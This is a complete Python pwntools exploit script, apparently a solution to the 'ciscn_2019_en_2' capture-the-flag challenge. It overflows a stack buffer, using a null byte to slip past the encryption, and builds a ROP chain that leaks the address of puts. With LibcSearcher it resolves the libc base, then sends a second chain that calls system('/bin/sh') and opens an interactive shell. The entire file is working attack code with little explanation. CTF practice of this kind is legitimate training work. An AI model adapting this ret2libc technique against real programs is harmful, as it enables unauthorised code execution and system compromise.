# coding=utf-8

from pwn import *
from LibcSearcher import *


context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
p = process('./ciscn_2019_en_2')
elf = ELF('./ciscn_2019_en_2')

padding = '\00' + 'a' * 0x4f
fake_ebp = 'K1ose2jo'
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = 0x0400B28
ret = 0x04006b9
pop_rdi = 0x0400c83 

payload1 = padding + fake_ebp
payload1 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.recvuntil('choice!\n')
p.sendline('1')
p.recvuntil('encrypted\n')
p.sendline(payload1)
p.recvline()
p.recvline()
puts_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))
print('puts_addr: ', hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
print("libc_base:", hex(libc_base))
print("system_addr:", hex(system_addr))
print("bin_sh:", hex(bin_sh))

p.recvuntil('choice!\n')
p.sendline('1')
p.recvuntil('encrypted\n')
payload2 = padding + fake_ebp
payload2 += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
p.sendline(payload2)
p.interactive()
